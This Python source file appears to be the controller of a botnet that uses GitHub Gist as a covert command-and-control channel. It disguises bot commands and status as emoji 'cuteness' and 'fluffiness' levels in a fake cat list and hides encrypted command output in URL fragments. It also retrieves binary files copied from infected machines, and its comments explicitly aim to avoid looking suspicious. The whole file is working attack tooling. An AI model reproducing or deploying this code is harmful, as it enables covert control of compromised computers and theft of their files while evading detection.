import os
import sys
import time
import random
import requests
import gistyc
import crypto
import ntpath
import emojis


def get_gist_api():
    """
    From AUTH_TOKEN ../token.txt get GIST_API and return

    :return: GIST_API (str)
    """
    with open('../token.txt') as f:
        AUTH_TOKEN = f.readline().strip()

    if len(AUTH_TOKEN) == 0:
        exit(-1)

    return gistyc.GISTyc(auth_token=AUTH_TOKEN)


def init_bot_list(gist_api, bot_list="CatsIWantToPet.md", list_content="# All the cats I wanna pet"):
    """
    Create a bot list on gist if not exists.

    :param: bot_list:        Filename of the bot list to be init
    :param: list_content:    Content of the bot list (title)
    :param: gist_api:        Gist api from get_gist_api() function
    :return: None
    """
    # Create file in tmp dir (if not exists on gist)
    posts = gist_api.get_gists()
    bot_list_exists = False
    for p in posts:
        if bot_list in p['files']:
            bot_list_exists = True
            break

    if not bot_list_exists:
        f = open("tmp/" + bot_list, "w")
        f.write(list_content)
        f.close()

        # Add file to GIST
        gist_api.create_gist(file_name="tmp/" + bot_list)

        # Remove file from tmp
        os.remove('tmp/' + bot_list)
        print("Bot list successfully created on gist")


def get_raw(gist_api, filename):
    """
    Get content of the filename gist post.

    :param gist_api:        Gist api grom get_gist_api() function
    :param filename:        Filename of the post to get
    :return:                Raw content of the filename post
    """
    # Find url of the filename on gist
    lst = gist_api.get_gists()
    url = None
    for g in lst:
        if filename in g['files']:
            url = g['files'][filename]['raw_url']

    if url is None:
        return None

    # Get content from the url
    f = requests.get(url)
    return f.text


def update_gist(gist_api, filename, content):
    """
    Update the gist post of specified filename. Send the specified content.

    :param gist_api:        Gist api grom get_gist_api() function
    :param filename:        Filename of the gist post to be updated
    :param content:         String content of the new post
    :return: None
    """
    f = open("tmp/" + filename, "w")
    f.write(content)
    f.close()
    gist_api.update_gist('tmp/' + filename)
    os.remove('tmp/' + filename)


def send_command(gist_api, cmd, filename, data=None, debug=True):
    """
    1. Check if filename exists on GIST
    2. Change status (Cuteness level) to reset
    3. Change command (Fluffiness level) according to cmd param
    4. Encode data to url link

    :param fernet_key:
    :param gist_api:        Gist api grom get_gist_api() function
    :param filename:        Filename f the bot post (Identification of bot)
    :param cmd:             Command to send
    :param data:            Parameters of the command
    :param debug:           Bool for debug messages
    :return:
    """
    content = get_raw(gist_api, filename)
    if content is None:
        if debug: print("\nERR: EXIT {} COMMAND ({} does not exists)".format(cmd, filename), file=sys.stderr, flush=True)
        return False

    # ----- Update status and command -----
    content_split = content.split('\n')
    # Change status to reset (only if not reset already)
    if content_split[1].split("cuteness")[-1].strip() not in emojis.status_code['reset']:
        content_split[1] = "### Level of cuteness " + random.choice(emojis.status_code['reset'])
    # Send ping command
    content_split[2] = "### Level of fluffiness " + emojis.command[cmd]

    # ----- Update data in url (encrypted) -----
    if data is not None:
        # Encrypt data to last url in port
        new_last_url = content_split[-1].split("#")[0].rstrip(')') + \
                       "#" + crypto.encrypt(data) + ")"
        content_split[-1] = new_last_url

    update_gist(gist_api, filename, "\n".join(content_split))
    if debug: print("{} {} COMMAND SEND".format(cmd, filename), file=sys.stderr, flush=True)
    return True


def check_response(gist_api, filename, time_to_wait=10):
    """
    In while loop check status of bot for 'time_to_wait' second.
    Return True if status is success.

    :param gist_api:        Gist api grom get_gist_api() function
    :param filename:        Filename f the bot post (Identification of bot)
    :param time_to_wait:    Time to wait for a response in seconds
    :return: Bool if bot responded
    """
    print("WAITING FOR RESPONSE", file=sys.stderr, end="", flush=True)
    while time_to_wait > 0:
        print(".", file=sys.stderr, end="", flush=True)
        content = get_raw(gist_api, filename)
        status = content.split('\n')[1].split("cuteness")[-1].strip()
        if status in emojis.status_code['success']:
            print(file=sys.stderr, flush=True)
            return True
        elif status in emojis.status_code['error']:
            print("\nERR: Command execution failed", file=sys.stderr, flush=True)
            return True     # As we still want to display output

        print(".", file=sys.stderr, end="", flush=True)
        time.sleep(1)
        time_to_wait -= 1

    print("\nERR: Bot did not respond", file=sys.stderr, flush=True)  # Do nothing as bot will be removed when pong
    return False


def print_response(gist_api, filename):
    """
    Read last url from content and decrypt data. Print to stdout.

    :param gist_api:        Gist api grom get_gist_api() function
    :param filename:        Filename f the bot post (Identification of bot)
    :return: None
    """
    content = get_raw(gist_api, filename)
    content_split = content.split("\n")
    data = content_split[-1].split("#")[1]
    data = crypto.decrypt(data)
    data = data.split('\n')

    for line in data:
        print(line)

    # Remove data from url (If too long -> Gist show entire url in post on main page = Too Suspicious)
    new_last_url = content_split[-1].split("#")[0] + ")"
    content_split[-1] = new_last_url
    update_gist(gist_api, filename, "\n".join(content_split))


def save_file_response(gist_api, filename, file):
    """
    Save binary file from the bot post last url into defined file.
    The files are copied to the 'copied' directory in Controller.

    :param gist_api:        Gist api grom get_gist_api() function
    :param filename:        Filename f the bot post (Identification of bot)
    :param file:            Name of the file to be saved
    :return:
    """
    content = get_raw(gist_api, filename)
    content_split = content.split("\n")
    data_array = content_split[-1].split("#")
    if len(data_array) > 1:
        data = crypto.decrypt_in_bytes(data_array[1].rstrip(')'))
        with open('copied/' + ntpath.basename(file), "wb") as binary_file:
            binary_file.write(data)

    # Remove data from url (If too long -> Gist show entire url in post on main page = Too Suspicious)
    new_last_url = content_split[-1].split("#")[0] + ")"
    content_split[-1] = new_last_url
    update_gist(gist_api, filename, "\n".join(content_split))



